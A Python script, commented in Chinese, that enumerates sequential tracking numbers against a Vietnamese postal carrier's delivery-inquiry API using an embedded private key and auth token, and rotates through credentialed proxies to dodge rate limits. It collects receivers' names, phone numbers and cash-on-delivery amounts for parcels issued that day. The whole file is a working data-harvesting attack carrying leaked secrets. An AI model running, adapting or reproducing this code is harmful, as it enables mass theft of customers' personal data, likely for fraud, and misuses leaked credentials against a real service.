#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
测试速度优化版本 - 验证限流重试功能
"""
import hashlib, requests, json, time, random, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

TODAY = datetime.now().strftime("%d/%m/%Y")
proxies, print_lock = [], threading.Lock()
state = {
    'found': 0, 
    'tested': 0, 
    'retries': 0,  # 重试次数统计
    'rate_limited': 0,  # 限流次数统计
    'orders': [], 
    'lock': threading.Lock(), 
    'start_time': time.time()
}
TARGET = 20  # 测试版：找20个

# 使用全部100个代理
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
]

def load_proxies():
    global proxies
    for p in PROXIES:
        parts = p.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
    print(f"✅ 加载 {len(proxies)} 个代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def is_today(date_str):
    return date_str and TODAY in str(date_str)

def call_api_with_retry(url, headers, data=None, json_data=None, max_retries=10):
    """调用API并支持限流重试（自动切换代理）"""
    for attempt in range(max_retries):
        try:
            # 随机选择代理
            proxy = random.choice(proxies) if proxies else None
            
            # 发送请求
            if json_data:
                r = requests.post(url, headers=headers, json=json_data, proxies=proxy, timeout=8)
            else:
                r = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
            
            # 检查响应
            if r.status_code == 200:
                try:
                    data = r.json()
                    code = data.get('Code', '')
                    
                    # 检测限流（Code: 98 或 429）
                    if code == '98' or code == '429':
                        # 记录限流
                        with state['lock']:
                            state['rate_limited'] += 1
                            state['retries'] += 1
                        
                        # 限流，换代理重试
                        time.sleep(0.2 + random.uniform(0, 0.3))
                        continue
                    
                    # 记录重试（非首次）
                    if attempt > 0:
                        with state['lock']:
                            state['retries'] += 1
                    
                    # 正常返回
                    return r, data
                except:
                    return r, None
            else:
                # HTTP错误，换代理重试
                if attempt < max_retries - 1:
                    with state['lock']:
                        state['retries'] += 1
                    time.sleep(0.1)
                    continue
                return r, None
                
        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                with state['lock']:
                    state['retries'] += 1
                continue
            return None, None
        except Exception as e:
            if attempt < max_retries - 1:
                with state['lock']:
                    state['retries'] += 1
                time.sleep(0.1)
                continue
            return None, None
    
    return None, None

def check_order(tracking):
    """检查订单"""
    if state['found'] >= TARGET:
        return None
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    with state['lock']:
        state['tested'] += 1
    
    # API 1: Inquiry（支持限流重试）
    r1, data1 = call_api_with_retry(
        f"{API_URL}api/Delivery/Inquiry",
        headers_form,
        data={"ParcelCode": tracking, "Signature": sig},
        max_retries=10
    )
    
    if r1 and data1 and data1.get('Code') == '00' and data1.get('Value'):
        v = data1['Value']
        
        # 检查日期
        issue_date = v.get('IssueDate') or v.get('LoadDate')
        if issue_date and not is_today(issue_date):
            return None
        
        # 保存订单（简化版）
        order = {
            'tracking': tracking,
            'sender': v.get('SenderName', ''),
            'receiver': v.get('ReceiverName', ''),
            'phone': v.get('ReceiverPhone', ''),
            'amount': v.get('CollectAmount', 0),
            'issue_date': issue_date or '空'
        }
        
        with state['lock']:
            state['found'] += 1
            state['orders'].append(order)
            
            elapsed = time.time() - state['start_time']
            speed = state['tested'] / elapsed if elapsed > 0 else 0
            
            safe_print(f"✅ [{state['found']}/{TARGET}] {tracking} | "
                      f"{order['receiver'][:15]} | {order['amount']:,}₫ | "
                      f"⚡{speed:.1f}/s | 🔄重试:{state['retries']} | 🚫限流:{state['rate_limited']}")
        
        return True
    
    return False

# 测试区间（中等规模）
TEST_RANGES = [
    ('EF', 43571000, 43571500, 1),  # 500个号段
]

print(f"""
╔════════════════════════════════════════════════════════════════════════════╗
║                   ⚡ 速度优化测试 - 限流重试验证                          ║
╚════════════════════════════════════════════════════════════════════════════╝

📋 测试配置:
  • 扫描范围: EF 43571000-43571500 (500个号段)
  • 并发线程: 20
  • 代理池: {len(PROXIES)} 个
  • 限流重试: 最多10次/请求
  • 自动切换代理

🎯 测试目标:
  • 找到 {TARGET} 个订单
  • 验证限流重试功能
  • 测试实际速度

""")

load_proxies()
print("🚀 开始测试...\n")

start_time = time.time()

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    
    for prefix, start, end, step in TEST_RANGES:
        for num in range(start, end, step):
            if state['found'] >= TARGET:
                break
            tracking = f"{prefix}{num:09d}VN"
            futures.append(executor.submit(check_order, tracking))
    
    for future in as_completed(futures):
        try:
            future.result()
            
            # 每100个显示统计
            if state['tested'] % 100 == 0:
                elapsed = time.time() - start_time
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                safe_print(f"\n📊 已扫{state['tested']} | 找到{state['found']} | "
                          f"⚡{speed:.1f}/s | 🔄重试:{state['retries']} | 🚫限流:{state['rate_limited']}\n")
        except:
            pass

elapsed = time.time() - start_time
print(f"""
\n{'='*80}
🎉 测试完成！
{'='*80}
找到订单: {state['found']} 个
测试总数: {state['tested']} 个
总重试: {state['retries']} 次
限流次数: {state['rate_limited']} 次
耗时: {elapsed:.1f} 秒
速度: {state['tested']/elapsed:.1f} 次/秒

✅ 限流处理:
  • 遇到限流自动切换代理
  • 最多重试10次直到成功
  • 平均每个请求重试: {state['retries']/state['tested']:.2f} 次

💡 性能分析:
  • 限流比例: {state['rate_limited']/state['tested']*100:.1f}%
  • 重试成功率: {(1 - state['rate_limited']/state['tested'])*100:.1f}%
{'='*80}
""")
